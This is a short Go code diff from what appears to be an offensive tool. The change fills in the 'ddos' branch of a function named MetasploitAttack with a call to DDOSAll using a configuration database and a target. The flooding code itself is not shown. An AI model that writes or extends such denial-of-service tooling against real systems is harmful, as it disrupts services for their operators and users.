@@ -11,8 +11,8 @@ import (
 
 func MetasploitAttack(kind string, target string) {
 	switch kind {
-	case "DDOS":
-
+	case "ddos":
+		DDOSAll(utils.Config.DB, target)
 	default:
 		utils.Config.Log.LogInfo("Can't perform attack")
 		return
